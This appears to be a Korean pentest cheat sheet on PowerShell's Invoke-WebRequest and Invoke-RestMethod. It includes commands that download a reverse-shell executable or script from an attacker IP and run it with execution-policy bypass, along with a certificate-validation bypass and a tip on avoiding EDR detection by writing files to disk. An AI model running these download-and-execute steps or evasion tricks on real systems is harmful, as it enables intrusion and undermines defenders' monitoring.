# Invoke-WebRequest / Invoke-RestMethod

- Invoke-WebRequest(iwr) — PowerShell 내장 HTTP 클라이언트 cmdlet. GET/POST 전송, 프록시 지정, 응답 저장이 가능하고 Invoke-RestMethod는 JSON/XML 응답을 객체로 바로 파싱해준다.
- 피해 호스트에서 파일을 내려받거나(-OutFile), 내부 API에 요청을 날려 결과를 확인할 때, Burp 등 프록시를 경유해 요청을 관찰하면서 워크플로를 만들 때.
- PowerShell 3.0 이상 내장. 별도 설치가 필요 없고 cmd에서는 powershell -c로 호출한다.

## GET과 파일 다운로드

```powershell
Invoke-WebRequest -Uri "http://10.10.10.1:8000/rev.exe" -OutFile C:\Windows\Temp\rev.exe
iwr "http://10.10.10.1:8000/rev.exe" -OutFile rev.exe -UseBasicParsing
```

- `-OutFile`: 응답 본문을 파일로 저장한다. PowerShell 3.0에서는 IE 파서 의존 오류가 나므로 `-UseBasicParsing`을 붙인다.
- 별칭 iwr이 있고, Windows PowerShell 5.1에서는 curl·wget도 iwr의 별칭이다.

## POST 전송

```powershell
Invoke-WebRequest -Uri "http://10.10.10.10/login" -Method Post `
  -Body "username=admin&password=admin" `
  -ContentType "application/x-www-form-urlencoded"

Invoke-RestMethod -Uri "http://10.10.10.10/api/login" -Method Post `
  -Body '{"user":"admin","pass":"admin"}' -ContentType "application/json"
```

- `-Method`: GET/POST/PUT/DELETE 지정. `-Body`에 폼 인코딩 문자열이나 JSON을 넣고 `-ContentType`을 맞춘다.
- Invoke-RestMethod는 JSON 응답을 객체로 변환하므로 `$r.data.token`처럼 바로 접근할 수 있다.

## 프록시와 인증서 검증

```powershell
Invoke-WebRequest -Uri "https://10.10.10.10/api" -Proxy "http://127.0.0.1:8080"
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
```

- `-Proxy`: 요청을 Burp(127.0.0.1:8080)로 통과시켜 실제 전송 내용을 관찰·수정한다.
- 자기서명 인증서 HTTPS에서는 Windows PowerShell 5.1 기준 인증서 검증 콜백을 임시로 $true로 둔다.

## 실전 예시

```powershell
# 다운로드 후 즉시 실행
IWR http://10.10.10.1/rev.ps1 -OutFile C:\Windows\Temp\rev.ps1 -UseBasicParsing
powershell -ep bypass -f C:\Windows\Temp\rev.ps1

# 세션 유지 로그인 후 보호 페이지 조회
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-RestMethod http://10.10.10.10/login -Method Post -Body @{user='admin';pass='admin'} -WebSession $s
Invoke-RestMethod http://10.10.10.10/admin -WebSession $s
```

- `-WebSession`에 WebRequestSession을 넘기면 쿠키가 유지되어 로그인 후 요청을 이어갈 수 있다.

## 팁·트러블슈팅

1. The response content cannot be parsed because the Internet Explorer engine is not available 오류가 나면 -UseBasicParsing을 붙인다.
2. 파일 다운로드가 실패하면 certutil -urlcache -split -f, curl.exe(Windows 10 이상 내장), Start-BitsTransfer로 전환한다.
3. IEX/DownloadString 조합은 EDR 감시가 강하다. 단순 수집용 다운로드는 -OutFile로 파일을 떨어뜨리는 편이 낫다.
